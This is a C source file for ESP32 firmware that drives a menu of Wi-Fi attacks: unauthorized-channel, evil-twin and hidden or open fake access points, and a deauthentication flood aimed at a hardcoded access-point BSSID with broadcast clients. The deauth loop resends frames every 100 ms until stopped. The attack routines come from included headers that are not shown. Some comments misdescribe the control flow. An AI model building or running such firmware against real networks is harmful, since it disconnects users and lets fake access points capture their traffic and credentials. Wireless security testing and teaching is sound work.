/*
 * main.c
 *
 *  Created on: 25 May 2025
 *      Author: HP
 */

#include <string.h>
#include "esp_task_wdt.h"
#include <stdio.h>
#include <stdbool.h>
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "esp_log.h"
#include "unothorized_channel.h"
#include "evil_twin.h"
#include "hidden_network.h"
#include "deauth_attack.h"
#include "open_network.h"
#include "menu_selection.h"

static const char *TAG = "main";

void app_main(void) {
    // Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    // Initialize TCP/IP adapter and event loop
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_ap();

    // Initialize WiFi
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

    // Check if TWDT is already initialized
    esp_err_t wdt_err = esp_task_wdt_status(NULL);
    if (wdt_err == ESP_ERR_INVALID_STATE) {
        esp_task_wdt_config_t wdt_config = {
            .timeout_ms = 5000,
            .idle_core_mask = 0,
            .trigger_panic = true
        };
        wdt_err = esp_task_wdt_init(&wdt_config);
        if (wdt_err != ESP_OK) {
            ESP_LOGE(TAG, "Failed to initialize TWDT: %s", esp_err_to_name(wdt_err));
            return;
        }
        ESP_LOGI(TAG, "TWDT initialized");
    } else {
        ESP_LOGI(TAG, "TWDT already initialized by system");
    }

    // Subscribe the main task to TWDT
    wdt_err = esp_task_wdt_add(NULL);
    if (wdt_err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to add main task to TWDT: %s", esp_err_to_name(wdt_err));
        return;
    }
    ESP_LOGI(TAG, "Main task subscribed to TWDT");

    while (1) { // Main loop to allow returning to menu
        // Call menu
        int selection = select_attack_menu();
        bool attack_running = false;

        // Deauth attack target parameters (defined here for selection 4)
        uint8_t deauth_bssid[6] = {0x34, 0x60, 0xF9, 0x3F, 0xD6, 0xC0}; // AP BSSID
        uint8_t deauth_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};   // Client MAC (broadcast)
        int deauth_channel = 1; // Channel from log

        switch (selection) {
            case 1:
                printf("Starting Unauthorized Channel Attack...\n");
                start_unothorized_channel_ap();
                attack_running = true;
                break;
            case 2:
                printf("Starting Evil Twin Attack...\n");
                start_fake_ap();
                attack_running = true;
                break;
            case 3:
                printf("Starting Hidden Network Attack...\n");
                start_hidden_ap();
                attack_running = true;
                break;
            case 4:
                printf("Starting Deauthentication Attack...\n");
                start_deauth_attack();
                attack_running = true;
                break;
            case 5:
                printf("Starting Open Network Attack...\n");
                start_open_ap();
                attack_running = true;
                break;
            case 6:
                printf("Stopping and exiting...\n");
                attack_running = false;
                break;
            default:
                printf("Error: Invalid selection\n");
                attack_running = false;
                continue; // Return to menu
        }

        // If an attack is running, wait for user input to stop
        if (attack_running) {
            char input_buffer[128];
            char cmd[32];
            int input_ready = 0;
            int chars_read = 0;
            TickType_t last_yield_time = xTaskGetTickCount();
            TickType_t last_deauth_time = xTaskGetTickCount(); // For deauth attack timing

            printf("Enter '1' to stop the attack and return to menu: ");

            while (!input_ready) {
                // Reset TWDT to prevent timeout
                esp_task_wdt_reset();

                // For deauth attack, send frames periodically
                if (selection == 4 && (xTaskGetTickCount() - last_deauth_time) >= pdMS_TO_TICKS(100)) {
                    sendDeauthFrame(deauth_bssid, deauth_channel, deauth_mac);
                    last_deauth_time = xTaskGetTickCount();
                }

                // Non-blocking input reading
                int ch = getchar();
                if (ch != EOF && ch != 0xFF) {
                    if (ch == '\n' || ch == '\r') {
                        input_ready = 1;
                        putchar('\n'); // Echo newline
                    } else if (chars_read < sizeof(input_buffer) - 1) {
                        input_buffer[chars_read++] = (char)ch;
                        putchar(ch); // Echo character
                    }
                }

                // Prevent watchdog timeout
                if (xTaskGetTickCount() - last_yield_time > pdMS_TO_TICKS(500)) {
                    esp_task_wdt_reset();
                    last_yield_time = xTaskGetTickCount();
                    vTaskDelay(1); // Yield CPU
                }

                vTaskDelay(10 / portTICK_PERIOD_MS);
            }

            input_buffer[chars_read] = '\0'; // Null-terminate input

            // Parse command
            memset(cmd, 0, sizeof(cmd));
            int parsed = sscanf(input_buffer, "%31s", cmd);

            if (parsed >= 1 && strcmp(cmd, "1") == 0) {
                ESP_LOGI(TAG, "Stopping attack...");
                // Stop WiFi
                esp_err_t err = esp_wifi_stop();
                if (err != ESP_OK) {
                    ESP_LOGE(TAG, "Failed to stop WiFi: %s", esp_err_to_name(err));
                } else {
                    ESP_LOGI(TAG, "WiFi stopped");
                }
                // For deauth attack, enable promiscuous mode
                if (selection == 4) {
                    err = esp_wifi_set_promiscuous(true);
                    if (err != ESP_OK) {
                        ESP_LOGE(TAG, "Failed to set promiscuous mode: %s", esp_err_to_name(err));
                    }
                }
            } else {
                ESP_LOGE(TAG, "Invalid command: %s. Attack continues.", cmd);
                attack_running = true; // Continue attack
                continue; // Return to input loop
            }
        }

        // If user selected '6', clean up and exit
        if (selection == 6) {
            ESP_LOGI(TAG, "Exiting program");
            break; // Exit main loop
        }
    }

    // Final cleanup
    esp_err_t err = esp_wifi_deinit();
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to deinit WiFi: %s", esp_err_to_name(err));
    }
    err = esp_task_wdt_delete(NULL);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to delete TWDT: %s", esp_err_to_name(err));
    }
    err = esp_task_wdt_deinit();
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to deinit TWDT: %s", esp_err_to_name(err));
    }
}
